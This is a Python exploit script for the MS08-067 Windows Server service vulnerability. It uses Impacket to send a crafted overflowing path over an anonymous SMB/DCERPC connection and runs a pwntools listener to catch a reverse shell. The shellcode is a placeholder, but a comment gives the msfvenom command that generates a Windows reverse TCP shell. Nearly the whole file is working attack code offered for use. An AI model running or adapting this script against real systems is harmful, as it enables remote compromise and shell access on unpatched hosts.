#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Modernized MS08-067 Exploit with Reverse TCP Shell
Based on Metasploit detection logic and Impacket implementation
Enhanced with pwntools for reverse shell handling
Usage: python ms08_067_exploit.py <target_ip> <lhost> <lport>
"""

from math import log
import sys
import threading
import time
import random
from impacket import smbconnection
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.srvs import NetprPathCanonicalize, ITYPE_UNC_WC_PATH
from impacket.dcerpc.v5.dtypes import WSTR, NULL
from impacket.uuid import uuidtup_to_bin
from pwn import listen, context
from lib.rex import RexNDR, RexText

context(os='windows', arch='x86', log_level = 'error')

def build_exploit_path(lhost: str, lport: int) -> bytes:
    """Construct malicious path for vulnerability exploitation"""
    path = b""
    path += RexText.to_unicode("\\")
    path += b"B" * 100
    path += b"S" * 16
    # use msfvenom to generate shellcode, b'shellcode' just a placeholder
    # msfvenom -p generic/shell_reverse_tcp LHOST=lhost LPORT=lport EXITFUNC=thread -a x86 --platform windows -b \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40 -f py
    #
    path += b"shellcode"
    path += b"E" * 16
    path += RexText.to_unicode("\\..\\..\\")
    path += RexText.to_unicode("A" * 7)
    path += b"P" * 4
    path += RexNDR.long(0x01001361)
    path += b"D" * 50
    path += b"\xeb\x72"
    path += b"D" * 18
    path += b"\x00\x00"
    return path

def execute_exploit(target_ip: str, lhost: str, lport: int, pipe: str = 'browser') -> bool:
    """Exploit MS08-067 vulnerability on target host"""
    try:
        print(f"[*] Target: {target_ip}:445 | Starting exploit")
        smb_conn = smbconnection.SMBConnection(target_ip, target_ip, sess_port=445)
        smb_conn.login('', '')
        print(f"[+] SMB connected | Target: {target_ip}")
        
        transport_string = f"ncacn_np:{target_ip}[\\pipe\\{pipe}]"
        transport_obj = transport.DCERPCTransportFactory(transport_string)
        transport_obj.set_smb_connection(smb_conn)
        
        print("[*] Creating DCERPC handle")
        dce = transport_obj.get_dce_rpc()
        dce.connect()
        
        service_uuid = '4b324fc8-1670-01d3-1278-5a47bf6ee188'
        version = '3.0'
        dce.bind(uuidtup_to_bin((service_uuid, version)))
        print(f"[+] DCERPC bound | Target: {target_ip}")
        
        exploit_path = build_exploit_path(lhost, lport)
        print(f"[*] Build evil path...")
        print(f"[*] Path length: {len(exploit_path)} bytes")
        print(f"[*] Path content:\n{RexText.hex_dump(exploit_path)}")
  
        try:
            print("[*] Building exploit request...")
            path_name = WSTR()
            path_name.fromString(RexNDR.unicode_conformant_varying_string_prebuilt(exploit_path))
            prefix = WSTR()
            prefix.fromString(RexNDR.wstring("\\"))

            request_stub = NetprPathCanonicalize()
            request_stub['ServerName'] = NULL
            request_stub['PathName'] = path_name
            request_stub['OutbufLen'] = random.randint(1, 1024)
            request_stub['Prefix'] = prefix
            request_stub['PathType'] = ITYPE_UNC_WC_PATH
            request_stub['Flags'] = 0

            request_raw = request_stub.getData()
            print(f"[*] Request length: {len(request_raw)} bytes")
            print(f"[*] Request content:\n{RexText.hex_dump(request_raw)}")

            print("[*] Sending exploit payload")
            dce.request(request_stub)

            dce.call(0x1f, request_stub)
            print("[+] Exploit payload sent successfully")
            return True
        except DCERPCException as e:
            print(f"[-] Call failed: {e}")
            return False
            
    except smbconnection.SessionError as e:
        print(f"[-] SMB error: {e}")
        return False
    except Exception as e:
        print(f"[-] General exception: {e}")
        return False
    finally:
        try:
            if 'dce' in locals():
                dce.disconnect()
            if 'smb_conn' in locals():
                smb_conn.logoff()
        except Exception:
            pass
def handle_reverse_shell(listen_port: int):
    """Handle incoming reverse shell connection"""
    print(f"[*] Starting reverse shell handler on port {listen_port}")
    listener = listen(listen_port)
    connection = listener.wait_for_connection()
    
    print("[+] Reverse shell connection established!")
    print("[!] Type 'exit' to quit shell\n")

    connection.interactive(prompt="")
    print("\n[!] Shell session closed")

def main():
    if len(sys.argv) != 4:
        print("Usage: python ms08_067_exploit.py <target_ip> <lhost> <lport>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    lhost = sys.argv[2]
    lport = int(sys.argv[3])
    
    print(f"[*] Target: {target_ip}")
    print(f"[*] Reverse shell to: {lhost}:{lport}")
    
    # Start reverse shell handler in background
    shell_thread = threading.Thread(target=handle_reverse_shell, args=(lport,))
    shell_thread.daemon = True
    shell_thread.start()
    
    # Give handler time to initialize
    time.sleep(2)
    
    # Launch exploit
    success = execute_exploit(target_ip, lhost, lport)
    
    if success:
        print("\n[!] Exploit triggered successfully")
        print("[*] Waiting for reverse shell connection...")
        
        # Wait for shell connection or timeout
        shell_thread.join(timeout=60)
        
        if shell_thread.is_alive():
            print("[-] Reverse shell connection timed out")
    else:
        print("\n[-] Exploit failed")
    
    print("[*] Exploit sequence completed")

if __name__ == "__main__":
    main()